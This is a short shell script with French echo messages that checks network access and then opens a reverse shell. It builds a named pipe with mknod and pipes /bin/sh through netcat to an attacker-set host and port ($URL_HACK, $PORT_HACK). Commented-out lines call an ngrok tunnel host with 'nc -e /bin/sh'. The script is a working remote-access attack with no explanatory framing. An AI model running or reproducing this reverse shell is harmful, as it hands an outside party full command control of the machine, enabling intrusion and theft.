echo "Test connexion"

curl google.fr

echo "Avant connexion"
# x=$(nc -e /bin/sh 0.tcp.eu.ngrok.io 14165)
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc $URL_HACK $PORT_HACK 1>/tmp/backpipe
# /bin/sh 0</tmp/backpipe | 0.tcp.eu.ngrok.io 14165 1>/tmp/backpipe
eval $x

